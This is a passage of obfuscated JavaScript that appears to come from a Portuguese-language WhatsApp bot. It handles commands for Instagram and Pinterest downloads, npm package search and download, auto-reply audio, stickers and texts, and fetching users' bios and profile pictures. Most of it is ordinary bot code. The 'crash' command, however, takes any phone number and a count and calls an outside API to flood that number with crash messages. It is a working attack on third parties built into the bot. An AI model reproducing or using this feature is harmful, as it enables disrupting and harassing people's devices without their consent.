                _0x263319.sendMessage(_0x4f1071, _0x27946e);
                return _0x403602("Envie um link de story do Instagram ou o @ do usuário");
              }
              const _0x263ea7 = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x1847af = {
                react: _0x263ea7
              };
              _0x263319.sendMessage(_0x4f1071, _0x1847af);
              try {
                const _0xa37423 = await fetchJson(SITE_JEFF_APIS + "/api/igstory?nome_url=" + encodeURIComponent(_0x2473a4) + "&apikey=" + _0x512d5e);
                if (!_0xa37423?.status || !_0xa37423.resultado) {
                  const _0x18d5b2 = {
                    text: "🤷‍♂️",
                    key: _0x302296.key
                  };
                  const _0x4e3e1b = {
                    react: _0x18d5b2
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x4e3e1b);
                  return _0x403602("Não foi possível encontrar a mídia. Verifique o link e tente novamente.");
                }
                const _0x240ff2 = _0xa37423.resultado.username;
                const _0x291879 = _0xa37423.resultado.profile_picture;
                const _0x4e85c4 = _0xa37423.resultado.images || [];
                const _0x4579cf = _0xa37423.resultado.videos || [];
                const _0x592435 = await getBuffer(_0x291879);
                const _0x43b0bd = "INFORMAÇÕES\n        \n• *Nome do usuário:* " + F + _0x240ff2 + F + "\n\n• *Mídias encontradas:* " + F + (_0x4e85c4.length + _0x4579cf.length) + F;
                const _0x36464a = {
                  title: "Informações do usuário",
                  body: "🤖⟩ " + NomeDoBot,
                  thumbnail: _0x592435,
                  mediaType: 1,
                  showAdAttribution: true,
                  sourceUrl: "https://www.instagram.com/" + _0x240ff2
                };
                const _0x54c5ea = {
                  externalAdReply: _0x36464a
                };
                const _0x34728f = {
                  text: _0x43b0bd,
                  contextInfo: _0x54c5ea
                };
                const _0x5aad6a = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x34728f, _0x5aad6a);
                const _0x229b82 = await Promise.all(_0x4e85c4.map(async (_0xaa292a, _0x47e501) => {
                  try {
                    const _0xf3f634 = _0xaa292a.image_download;
                    const _0x204fcb = await getBuffer(_0xf3f634);
                    const _0x38dca3 = {
                      url: _0xf3f634
                    };
                    const _0x4d7348 = {
                      image: _0x38dca3
                    };
                    const _0x18e259 = {
                      upload: _0x263319.waUploadToServer
                    };
                    const _0x2a53e5 = await prepareWAMessageMedia(_0x4d7348, _0x18e259);
                    const _0x5a2e40 = {
                      hasMediaAttachment: true,
                      imageMessage: _0x2a53e5.imageMessage
                    };
                    const _0x558729 = {
                      text: "" + NomeDoBot
                    };
                    return {
                      header: _0x5a2e40,
                      headerType: "IMAGE",
                      body: {
                        text: "Imagem " + (_0x47e501 + 1)
                      },
                      footer: _0x558729,
                      nativeFlowMessage: {
                        buttons: []
                      }
                    };
                  } catch (_0x2bed5f) {
                    console.error("Erro ao preparar mensagem de imagem");
                    return null;
                  }
                }));
                const _0x4b24e3 = await Promise.all(_0x4579cf.map(async (_0x598f98, _0x35eceb) => {
                  try {
                    const _0x291ec5 = _0x598f98.video_download;
                    const _0x212f79 = {
                      url: _0x291ec5
                    };
                    const _0x11d5a9 = {
                      video: _0x212f79
                    };
                    const _0x3455c8 = {
                      upload: _0x263319.waUploadToServer
                    };
                    const _0x1ee526 = await prepareWAMessageMedia(_0x11d5a9, _0x3455c8);
                    const _0x449eb9 = {
                      hasMediaAttachment: true,
                      videoMessage: _0x1ee526.videoMessage
                    };
                    const _0x3629b7 = {
                      text: "" + NomeDoBot
                    };
                    return {
                      header: _0x449eb9,
                      headerType: "VIDEO",
                      body: {
                        text: "Vídeo " + (_0x35eceb + 1)
                      },
                      footer: _0x3629b7,
                      nativeFlowMessage: {
                        buttons: []
                      }
                    };
                  } catch (_0x362124) {
                    console.error("Erro ao preparar mensagem de vídeo");
                    return null;
                  }
                }));
                if (_0x229b82.length > 0) {
                  const _0xe2eb3e = {
                    cards: _0x229b82
                  };
                  const _0x52e1eb = {
                    carouselMessage: _0xe2eb3e
                  };
                  const _0x34e69d = {
                    interactiveMessage: _0x52e1eb
                  };
                  const _0x4362f1 = _0x34e69d;
                  await _0x263319.relayMessage(_0x4f1071, _0x4362f1, {});
                }
                if (_0x4b24e3.length > 0) {
                  const _0xc7780e = {
                    cards: _0x4b24e3
                  };
                  const _0xb3332e = {
                    carouselMessage: _0xc7780e
                  };
                  const _0x93e31b = {
                    interactiveMessage: _0xb3332e
                  };
                  const _0x4fd98a = _0x93e31b;
                  await _0x263319.relayMessage(_0x4f1071, _0x4fd98a, {});
                }
                const _0x333c2d = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x11832d = {
                  react: _0x333c2d
                };
                _0x263319.sendMessage(_0x4f1071, _0x11832d);
              } catch (_0x217593) {
                console.error("Erro ao processar request");
                const _0x5adafd = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x2017c3 = {
                  react: _0x5adafd
                };
                _0x263319.sendMessage(_0x4f1071, _0x2017c3);
                _0x403602("API talvez esteja off, tenta de novo mais tarde!");
              }
              break;
            case "pinterest":
              try {
                const _0x2a293b = _0x40e45c.join(" ");
                if (!_0x2a293b) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " naruto");
                }
                const _0x1fd204 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x47f077 = {
                  react: _0x1fd204
                };
                _0x263319.sendMessage(_0x4f1071, _0x47f077);
                const _0xad7e92 = [];
                for (let _0x557a20 = 0; _0x557a20 < 10; _0x557a20++) {
                  const _0xa17f54 = SITE_JEFF_APIS + "/api/pinterest?text=" + encodeURIComponent(_0x2a293b) + "&apikey=" + _0x512d5e;
                  const _0x521690 = await fetch(_0xa17f54);
                  if (!_0x521690.ok) {
                    throw new Error("Erro ao buscar imagem: " + _0x521690.statusText);
                  }
                  const _0x50dc3d = await _0x521690.arrayBuffer();
                  const _0x75bae7 = Buffer.from(_0x50dc3d);
                  const _0x5b009b = {
                    image: _0x75bae7
                  };
                  const _0x2aaffd = {
                    upload: _0x263319.waUploadToServer
                  };
                  const _0xad5dc3 = await prepareWAMessageMedia(_0x5b009b, _0x2aaffd);
                  const _0x507b98 = {
                    hasMediaAttachment: true,
                    imageMessage: _0xad5dc3.imageMessage
                  };
                  const _0x4d10b2 = {
                    text: "by: " + NomeDoBot
                  };
                  _0xad7e92.push({
                    header: _0x507b98,
                    headerType: "IMAGE",
                    body: {
                      text: "Imagem: " + (_0x557a20 + 1)
                    },
                    footer: _0x4d10b2,
                    nativeFlowMessage: {
                      buttons: []
                    }
                  });
                }
                const _0x42d44b = {
                  cards: _0xad7e92
                };
                const _0x4dd438 = {
                  carouselMessage: _0x42d44b
                };
                const _0x44fe15 = {
                  interactiveMessage: _0x4dd438
                };
                _0x263319.relayMessage(_0x4f1071, _0x44fe15, {});
                const _0x1aa04b = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x200625 = {
                  react: _0x1aa04b
                };
                _0x263319.sendMessage(_0x4f1071, _0x200625);
              } catch (_0xfc7f31) {
                console.error(_0xfc7f31);
                const _0x4dcd62 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x581a93 = {
                  react: _0x4dcd62
                };
                _0x263319.sendMessage(_0x4f1071, _0x581a93);
                const _0x1d4928 = {
                  body: "" + infoerror,
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x1d4928);
              }
              break;
            case "npmdl":
              {
                if (!_0x1d6557) {
                  return _0x403602("Por favor, forneça o termo de pesquisa para npm.");
                }
                try {
                  const _0x5a46a9 = require("adm-zip");
                  const _0x5b7ce1 = require("child_process").execSync;
                  const _0x5d984e = require("tar");
                  const _0xb775c9 = encodeURIComponent(_0x1d6557.trim());
                  const _0x1458b7 = "https://registry.npmjs.org/-/v1/search?text=" + _0xb775c9 + "&size=5";
                  axios.get(_0x1458b7).then(_0x36146a => {
                    const _0x23ab85 = _0x36146a.data.objects;
                    if (!_0x23ab85 || _0x23ab85.length === 0) {
                      return _0x403602("Nenhum resultado encontrado para \"" + _0x1d6557 + "\" na pesquisa do npm.");
                    }
                    const _0x56d5ba = _0x23ab85[0].package;
                    const _0x4d87ad = _0x56d5ba.name;
                    const _0x4c8374 = _0x56d5ba.version;
                    const _0x24ac95 = _0x56d5ba.description;
                    const _0xdc39ee = path.join(__dirname, "temp");
                    const _0x1a9abc = path.join(_0xdc39ee, _0x4d87ad + "-" + _0x4c8374 + ".tgz");
                    const _0x2af00a = path.join(__dirname, _0x4d87ad + ".zip");
                    const _0x285204 = {
                      recursive: true
                    };
                    fs.mkdirSync(_0xdc39ee, _0x285204);
                    console.log("Baixando o pacote " + _0x4d87ad + "...");
                    _0x5b7ce1("npm pack " + _0x4d87ad + " --pack-destination " + _0xdc39ee);
                    if (!fs.existsSync(_0x1a9abc)) {
                      console.error("Arquivo não encontrado: " + _0x1a9abc);
                      return _0x403602("Erro: O arquivo " + _0x4d87ad + "-" + _0x4c8374 + ".tgz não foi criado.");
                    }
                    const _0x1e2104 = path.join(_0xdc39ee, _0x4d87ad + ".tgz");
                    fs.renameSync(_0x1a9abc, _0x1e2104);
                    const _0x371a4d = path.join(_0xdc39ee, _0x4d87ad);
                    const _0x4c8b33 = {
                      recursive: true
                    };
                    fs.mkdirSync(_0x371a4d, _0x4c8b33);
                    const _0x1597b9 = {
                      file: _0x1e2104,
                      C: _0x371a4d
                    };
                    _0x5d984e.x(_0x1597b9).then(() => {
                      const _0x5edaf3 = new _0x5a46a9();
                      _0x5edaf3.addLocalFolder(_0x371a4d);
                      _0x5edaf3.writeZip(_0x2af00a);
                      const _0x5ba735 = async _0x45d4b7 => {
                        const _0x4bb441 = fs.readFileSync(_0x45d4b7);
                        const _0x1d55e1 = path.basename(_0x45d4b7);
                        _0x403602("\n    *【﻿░M░░O░D░U░L░O░】*\n\n\n° *NOME:* " + _0x4d87ad + "\n─────────────────────\n° *VERSÃO:* " + _0x4c8374 + "\n─────────────────────\n° *DESCRIÇÃO:* " + _0x24ac95 + "\n ─────────────────────\n \n \n> 📥 𝘙𝘦𝘢𝘭𝘪𝘻𝘢𝘯𝘥𝘰 𝘰 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥...");
                        const _0x5c149d = {
                          document: _0x4bb441,
                          mimetype: "application/zip",
                          fileName: _0x1d55e1,
                          caption: ""
                        };
                        const _0x55877b = {
                          quoted: _0xa6b34
                        };
                        await _0x263319.sendMessage(_0x4f1071, _0x5c149d, _0x55877b);
                      };
                      _0x5ba735(_0x2af00a).then(() => {
                        console.log("Arquivo enviado com sucesso!");
                        const _0x2709dc = {
                          recursive: true,
                          force: true
                        };
                        fs.rmSync(_0xdc39ee, _0x2709dc);
                      }).catch(_0x5ddc69 => {
                        console.error("Erro ao enviar o arquivo:", _0x5ddc69);
                      });
                    }).catch(_0x141100 => {
                      console.error("Erro: ", _0x141100);
                    });
                  }).catch(_0x565fab => {
                    console.error(_0x565fab);
                    _0x403602("erro");
                  });
                } catch (_0x12d9d8) {
                  console.error(_0x12d9d8);
                  _0x403602("deu erro aqui. 😔");
                  _0x4eb57a("❌");
                }
              }
              break;
            case "npm":
            case "npmsrc":
            case "npmsearch":
            case "npmpesquisa":
            case "npmp":
              {
                if (!_0x1d6557) {
                  _0x403602("Por favor, forneça o nome do modulo!");
                  return _0x4eb57a("😐");
                }
                try {
                  const _0x586a8e = require("adm-zip");
                  const _0x983fa6 = require("child_process").execSync;
                  const _0x207889 = require("tar");
                  const _0x3a66a0 = encodeURIComponent(_0x1d6557.trim());
                  const _0xd657e4 = "https://registry.npmjs.org/-/v1/search?text=" + _0x3a66a0 + "&size=5";
                  axios.get(_0xd657e4).then(_0x87e5ae => {
                    const _0x3f400d = _0x87e5ae.data.objects;
                    if (!_0x3f400d || _0x3f400d.length === 0) {
                      return _0x403602("modulo *" + _0x1d6557 + "* não encontrado.");
                    }
                    const _0xc452fe = _0x3f400d.map(_0x18dbac => ({
                      header: "Nome: " + _0x18dbac.package.name,
                      title: "Versão: " + _0x18dbac.package.version,
                      description: "Descrição: " + (_0x18dbac.package.description || "Sem descrição"),
                      id: _0x1d93be + "npmdl " + _0x18dbac.package.name
                    }));
                    const _0x43ea9f = {
                      text: "\n   *【﻿ D O W N L O D - N P M】*\n\n\n• Resultados para a pesquisa: *" + _0x1d6557 + "*"
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        body: _0x43ea9f,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                              title: "Selecione um módulo",
                              sections: [{
                                title: "Pacotes disponíveis:",
                                rows: _0xc452fe
                              }]
                            })
                          }],
                          messageParamsJson: ""
                        }
                      }
                    }, {});
                  }).catch(_0x54ea0e => {
                    console.error(_0x54ea0e);
                    _0x403602("Erro ao realizar a pesquisa no npm. Por favor, tente novamente mais tarde.");
                  });
                } catch (_0x490f8d) {
                  console.error(_0x490f8d);
                  _0x403602("Ocorreu um erro ao processar sua solicitação para npm.");
                }
              }
              break;
            case "addaudio":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                if (!_0x6aebb1) {
                  return _0x403602("Por favor, marque um áudio para ser salvo.");
                }
                try {
                  const _0x320861 = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage;
                  let _0x538519 = await getFileBuffer(_0x320861, "audio");
                  const _0x137ffa = _0x1d6557;
                  if (!_0x137ffa) {
                    return _0x403602("Por favor, forneça uma palavra ou frase para ativar o áudio, por exemplo: !addaudio pika");
                  }
                  const _0x11baad = path.join(__dirname, "DADOS/audios");
                  const _0x4833b5 = path.join(_0x11baad, _0x137ffa + ".mp3");
                  const _0x175bce = path.join(_0x11baad, "audios.json");
                  if (!fs.existsSync(_0x11baad)) {
                    fs.mkdirSync(_0x11baad);
                  }
                  let _0x28ede6 = fs.existsSync(_0x175bce) ? JSON.parse(fs.readFileSync(_0x175bce, "utf-8")) : {};
                  if (_0x28ede6[_0x137ffa]) {
                    return _0x403602("Já existe um áudio associado à palavra ou frase \"" + _0x137ffa + "\". Por favor, escolha outra.");
                  }
                  fs.writeFileSync(_0x4833b5, _0x538519);
                  _0x28ede6[_0x137ffa] = "./DADOS/audios/" + _0x137ffa + ".mp3";
                  fs.writeFileSync(_0x175bce, JSON.stringify(_0x28ede6, null, 2));
                  _0x403602("Áudio salvo com sucesso! para auto resposta para Palavra/frase: \"" + _0x137ffa + "\"");
                } catch (_0x528a12) {
                  console.error("Erro ao salvar o áudio:", _0x528a12);
                  _0x403602("Houve um erro ao salvar o áudio. Tente novamente.");
                }
              }
              break;
            case "delaudio":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                const _0x1538ee = _0x1d6557;
                if (!_0x1538ee) {
                  return _0x403602("Por favor, forneça a palavra ou frase do áudio que deseja deletar, por exemplo: !delaudio pika");
                }
                try {
                  const _0x2c094c = path.join(__dirname, "DADOS/audios");
                  const _0x7d8693 = path.join(_0x2c094c, "audios.json");
                  if (!fs.existsSync(_0x7d8693)) {
                    return _0x403602("Não há áudios salvos no momento.");
                  }
                  let _0x60a654 = JSON.parse(fs.readFileSync(_0x7d8693, "utf-8"));
                  if (!_0x60a654[_0x1538ee]) {
                    return _0x403602("Nenhum áudio encontrado para a palavra ou frase \"" + _0x1538ee + "\".");
                  }
                  const _0x56ff48 = path.join(__dirname, _0x60a654[_0x1538ee]);
                  if (fs.existsSync(_0x56ff48)) {
                    fs.unlinkSync(_0x56ff48);
                  }
                  delete _0x60a654[_0x1538ee];
                  fs.writeFileSync(_0x7d8693, JSON.stringify(_0x60a654, null, 2));
                  _0x403602("Áudio associado à palavra/frase \"" + _0x1538ee + "\" foi deletado com sucesso.");
                } catch (_0x22836b) {
                  console.error("Erro ao deletar o áudio:", _0x22836b);
                  _0x403602("Houve um erro ao deletar o áudio. Tente novamente.");
                }
              }
              break;
            case "listaaudios":
            case "listaaudio":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                try {
                  const _0x184d62 = path.join(__dirname, "DADOS/audios");
                  const _0x13cf99 = path.join(_0x184d62, "audios.json");
                  if (!fs.existsSync(_0x13cf99)) {
                    return _0x403602("Nenhum áudio foi salvo até agora.");
                  }
                  const _0x41b090 = JSON.parse(fs.readFileSync(_0x13cf99, "utf-8"));
                  const _0xda92b6 = Object.keys(_0x41b090);
                  if (_0xda92b6.length === 0) {
                    return _0x403602("Nenhum áudio foi salvo até agora.");
                  }
                  let _0x1f9ed0 = "🗂️ *Áudios de auto resposta Salvos:*\n\n";
                  _0x1f9ed0 += _0xda92b6.map((_0x27ab01, _0x233c2b) => _0x233c2b + 1 + ". " + _0x27ab01).join("\n");
                  _0x403602(_0x1f9ed0);
                } catch (_0x450535) {
                  console.error("Erro ao listar os áudios:", _0x450535);
                  _0x403602("Houve um erro ao listar os áudios. Tente novamente.");
                }
              }
              break;
            case "addsticker":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                if (!_0x1785a1) {
                  return _0x403602("Por favor, marque uma figurinha para ser salva.");
                }
                try {
                  const _0x4a151e = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage;
                  const _0x38364e = _0x1d6557;
                  if (!_0x38364e) {
                    return _0x403602("Por favor, forneça uma palavra ou frase para ativar a figurinha, por exemplo: !addsticker pika");
                  }
                  const _0x1ace44 = path.join(__dirname, "DADOS/stickers");
                  const _0x3d70e5 = path.join(_0x1ace44, _0x38364e + ".webp");
                  if (!fs.existsSync(_0x1ace44)) {
                    fs.mkdirSync(_0x1ace44);
                  }
                  const _0x3e920f = path.join(_0x1ace44, "stickers.json");
                  let _0x5ba135 = fs.existsSync(_0x3e920f) ? JSON.parse(fs.readFileSync(_0x3e920f, "utf-8")) : {};
                  if (_0x5ba135[_0x38364e]) {
                    return _0x403602("☝️🤓 Ops! Já existe uma figurinha associada à palavra ou frase \"" + _0x38364e + "\". Por favor, escolha outra.");
                  }
                  const _0x3603fa = await getFileBuffer(_0x4a151e, "sticker");
                  const _0x4ae77a = new Sticker();
                  _0x4ae77a.addFile(Buffer.from(_0x3603fa));
                  _0x4ae77a.options.metadata = {
                    pack: "🧙‍♂️@JEFFERSON_DDOS",
                    author: "DOMINA🔥"
                  };
                  const _0x51fabb = await _0x4ae77a.start();
                  if (Array.isArray(_0x51fabb) && _0x51fabb[0].status === "fulfilled") {
                    const _0x398f54 = _0x51fabb[0].value;
                    const _0x2a1220 = fs.readFileSync(_0x398f54);
                    fs.writeFileSync(_0x3d70e5, _0x2a1220);
                    _0x5ba135[_0x38364e] = _0x3d70e5.replace(__dirname, ".");
                    fs.writeFileSync(_0x3e920f, JSON.stringify(_0x5ba135, null, 2));
                    fs.unlinkSync(_0x398f54);
                    _0x403602("✅ Figurinha salva com sucesso! para auto resposta para Palavra/frase: \"" + _0x38364e + "\"");
                  } else {
                    console.error("Erro: O retorno não contém o arquivo da figurinha");
                    return _0x403602("Houve um erro ao processar a figurinha. Tente novamente.");
                  }
                } catch (_0x5b8507) {
                  console.error("Erro ao salvar a figurinha:", _0x5b8507);
                  _0x403602("Houve um erro ao salvar a figurinha. Tente novamente.");
                }
              }
              break;
            case "delsticker":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                const _0x1e76e0 = _0x1d6557;
                if (!_0x1e76e0) {
                  return _0x403602("Por favor, forneça a palavra ou frase associada à figurinha que deseja deletar.");
                }
                try {
                  const _0x39cb69 = path.join(__dirname, "DADOS/stickers");
                  const _0x15df67 = path.join(_0x39cb69, "stickers.json");
                  if (!fs.existsSync(_0x15df67)) {
                    return _0x403602("Nenhuma figurinha foi salva até agora.");
                  }
                  let _0xf740c0 = JSON.parse(fs.readFileSync(_0x15df67, "utf-8"));
                  if (!_0xf740c0[_0x1e76e0]) {
                    return _0x403602("Nenhuma figurinha encontrada para a palavra/frase: \"" + _0x1e76e0 + "\".");
                  }
                  const _0x5d6ce7 = path.join(__dirname, _0xf740c0[_0x1e76e0]);
                  if (fs.existsSync(_0x5d6ce7)) {
                    fs.unlinkSync(_0x5d6ce7);
                  }
                  delete _0xf740c0[_0x1e76e0];
                  fs.writeFileSync(_0x15df67, JSON.stringify(_0xf740c0, null, 2));
                  _0x403602("Figurinha associada à palavra/frase \"" + _0x1e76e0 + "\" foi deletada com sucesso.");
                } catch (_0x1fe599) {
                  console.error("Erro ao deletar a figurinha:", _0x1fe599);
                  _0x403602("Houve um erro ao deletar a figurinha. Tente novamente.");
                }
              }
              break;
            case "listastickers":
            case "listasticker":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                try {
                  const _0x9fc588 = path.join(__dirname, "DADOS/stickers");
                  const _0x4841ea = path.join(_0x9fc588, "stickers.json");
                  if (!fs.existsSync(_0x4841ea)) {
                    return _0x403602("Nenhuma figurinha foi salva até agora.");
                  }
                  const _0x201e9e = JSON.parse(fs.readFileSync(_0x4841ea, "utf-8"));
                  const _0x3fcc28 = Object.keys(_0x201e9e);
                  if (_0x3fcc28.length === 0) {
                    return _0x403602("Nenhuma figurinha foi salva até agora.");
                  }
                  let _0x235420 = "🗂️ *Figurinhas do auto resposta Salvas:*\n\n";
                  _0x235420 += _0x3fcc28.map((_0x5d0180, _0x33f0fb) => _0x33f0fb + 1 + ". " + _0x5d0180).join("\n");
                  _0x403602(_0x235420);
                } catch (_0x489176) {
                  console.error("Erro ao listar as figurinhas:", _0x489176);
                  _0x403602("Houve um erro ao listar as figurinhas. Tente novamente.");
                }
              }
              break;
            case "addtexto":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                if (!_0x1d6557) {
                  return _0x403602("Por favor, forneça uma palavra ou frase para ativar o texto, por exemplo: !addtexto ola");
                }
                try {
                  const _0x2f9fb7 = _0x1d6557.trim();
                  const _0xa3effb = _0x302296.message.extendedTextMessage?.contextInfo?.quotedMessage?.conversation;
                  if (!_0xa3effb) {
                    return _0x403602("Por favor, mencione um texto para salvar, por exemplo: !addtexto ola (e mencione um texto).");
                  }
                  const _0x26a342 = path.join(__dirname, "DADOS");
                  const _0x3ed0ac = path.join(_0x26a342, "texts.json");
                  if (!fs.existsSync(_0x26a342)) {
                    fs.mkdirSync(_0x26a342);
                  }
                  let _0x245570 = fs.existsSync(_0x3ed0ac) ? JSON.parse(fs.readFileSync(_0x3ed0ac, "utf-8")) : {};
                  if (_0x245570[_0x2f9fb7]) {
                    return _0x403602("☝️🤓 Ops! Já existe um texto associado à palavra ou frase \"" + _0x2f9fb7 + "\". Por favor, escolha outra.");
                  }
                  _0x245570[_0x2f9fb7] = _0xa3effb;
                  fs.writeFileSync(_0x3ed0ac, JSON.stringify(_0x245570, null, 2));
                  _0x403602("✅ Texto salvo com sucesso! para auto resposta para Palavra/frase: \"" + _0x2f9fb7 + "\"");
                } catch (_0x4151f7) {
                  console.error("Erro ao salvar o texto:", _0x4151f7);
                  _0x403602("Houve um erro ao salvar o texto. Tente novamente.");
                }
              }
              break;
            case "deltexto":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                if (!_0x1d6557) {
                  return _0x403602("Por favor, forneça a palavra ou frase que deseja remover.");
                }
                try {
                  const _0xaa41e2 = path.join(__dirname, "DADOS", "texts.json");
                  if (!fs.existsSync(_0xaa41e2)) {
                    return _0x403602("🚫 Nenhum texto automático foi configurado para ser removido.");
                  }
                  const _0x8df798 = JSON.parse(fs.readFileSync(_0xaa41e2, "utf-8"));
                  if (!_0x8df798[_0x1d6557]) {
                    return _0x403602("🚫 Não foi encontrado nenhum texto associado à palavra ou frase \"" + _0x1d6557 + "\".");
                  }
                  delete _0x8df798[_0x1d6557];
                  fs.writeFileSync(_0xaa41e2, JSON.stringify(_0x8df798, null, 2));
                  _0x403602("✅ Texto automático associado à palavra ou frase \"" + _0x1d6557 + "\" foi removido com sucesso.");
                } catch (_0x2588be) {
                  console.error("Erro ao remover texto automático:", _0x2588be);
                  _0x403602("Houve um erro ao remover o texto automático. Tente novamente.");
                }
              }
              break;
            case "listatextos":
            case "listatexto":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x193ccd) {
                  return _0x403602(_0x435246);
                }
                try {
                  const _0x58afee = path.join(__dirname, "DADOS", "texts.json");
                  if (!fs.existsSync(_0x58afee)) {
                    return _0x403602("🚫 Nenhum texto automático foi configurado ainda.");
                  }
                  const _0xaa07df = JSON.parse(fs.readFileSync(_0x58afee, "utf-8"));
                  const _0x200899 = Object.keys(_0xaa07df);
                  if (_0x200899.length === 0) {
                    return _0x403602("🚫 Nenhum texto automático foi configurado ainda.");
                  }
                  const _0x506cf1 = _0x200899.map((_0x37cf53, _0x1c52a1) => _0x1c52a1 + 1 + ". " + _0x37cf53).join("\n");
                  _0x403602("🗂️ *Textos de auto resposta salvos:*\n\n" + _0x506cf1 + "\n\n");
                } catch (_0x1ba8ea) {
                  console.error("Erro ao listar textos automáticos:", _0x1ba8ea);
                  _0x403602("Houve um erro ao listar os textos automáticos. Tente novamente.");
                }
              }
              break;
            case "manu":
              ABC = await fetchJson(SITE_JEFF_APIS + "/ia/ia-lesbica/manu?pushname=" + encodeURIComponent(_0x55a6ac) + "&q=" + encodeURIComponent(_0x1d6557) + "&nome_bot=" + encodeURIComponent(NomeDoBot) + "&apikey=" + encodeURIComponent(_0x512d5e));
              _0x403602("" + ABC.resultado);
              break;
            case "antirequest":
            case "antirequestmensagem":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e) {
                return _0x403602(enviar.msg.adm);
              }
              if (!_0x5550bd) {
                return _0x403602(enviar.msg.Badmin);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x24bf3d) {
                  return _0x403602("O recurso de antirequest já está ativado.");
                }
                _0x3bd584[0].antirequest = true;
                _0x33e29e(_0x3bd584);
                _0x403602("✔️ Ativou com sucesso o recurso de antirequest neste grupo.\n        \nAnti ao comando " + _0x1d93be + "div de bots");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x24bf3d) {
                  return _0x403602("O recurso de antirequest já está desativado.");
                }
                _0x3bd584[0].antirequest = false;
                _0x33e29e(_0x3bd584);
                _0x403602("✔️ Desativou com sucesso o recurso de antirequest neste grupo.️        \nAnti ao comando " + _0x1d93be + "div de bots");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "crash":
              try {
                if (!_0x40e45c || _0x40e45c.length === 0) {
                  _0x403602("Por favor, informe o número e a quantidade no formato correto: !crash número/quantidade");
                  break;
                }
                const _0x5baf97 = Array.isArray(_0x40e45c) ? _0x40e45c.join(" ") : String(_0x40e45c);
                var [_0x4ad0b4, _0x531709] = _0x5baf97.split("/");
                if (!_0x4ad0b4 || !_0x531709 || isNaN(_0x531709)) {
                  _0x403602("Formato inválido! Use o formato: !crash número/quantidade");
                  break;
                }
                _0x4ad0b4 = _0x4ad0b4.replace(/\D/g, "");
                if (_0x4ad0b4.length < 12) {
                  _0x403602("Número inválido! O número deve conter o código do país e ser no formato correto.");
                  break;
                }
                const _0x327191 = await fetchJson(SITE_JEFF_APIS + "/api/crash?numero=" + _0x4ad0b4 + "&quantidade=" + _0x531709 + "&apikey=" + _0x512d5e);
                if (!_0x327191 || !_0x327191.status) {
                  throw new Error("Resposta da API inválida.");
                }
                _0x403602("\nStatus do crash: " + (_0x327191.resultado.status ? "Sucesso" : "Falha") + "\n\nMensagem: " + _0x327191.resultado.message + "\n\nQuantidade: " + _0x327191.resultado.total + "\n    ");
              } catch (_0x5bdc28) {
                _0x403602("Ocorreu um erro: " + _0x5bdc28.message);
              }
              break;
            case "getbio":
            case "pegarbio":
              if (!_0x1dcf0a) {
                return _0x403602("Marque o usuário que você quer puxar a bio/status, a mensagem ou o @");
              }
              try {
                let _0xa032af = await _0x263319.fetchStatus(_0x1dcf0a.split("@")[0] + "@c.us");
                if (_0xa032af && _0xa032af.status) {
                  _0x403602("" + _0xa032af.status);
                } else {
                  _0x403602("O usuário não possui biografia comfigurado.");
                }
              } catch (_0x46d1fc) {
                console.error(_0x46d1fc);
                _0x403602("❌ Não foi possível pegar a biografia do usuário ❌");
              }
              break;
            case "getperfil":
            case "pegarperfil":
              if (!_0x1dcf0a) {
                return _0x403602("Marque o usuário que você quer puxar a foto de perfil, a mensagem ou o @");
              }
              try {
                ppimg = await _0x263319.profilePictureUrl(_0x1dcf0a.split("@")[0] + "@c.us", "image");
              } catch {
                return _0x5b6fe5("❌ não foi possível pegar a foto de perfil do usuário ❌");
              }
              const _0x4e7eac = {
                url: ppimg
              };
              const _0x4cccd0 = {
                image: _0x4e7eac
              };
              const _0x106423 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x4cccd0, _0x106423);
              break;
            case "button_teste":
              const _0x1d871e = [{
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "Nome do Botão",
                  sections: [{
                    title: "Dono / Criador",
                    rows: [{
                      title: "Menu dono",
                      id: _0x1d93be + "menudono",
                      disabled: false
                    }]
                  }, {
                    title: "teste",
                    rows: [{
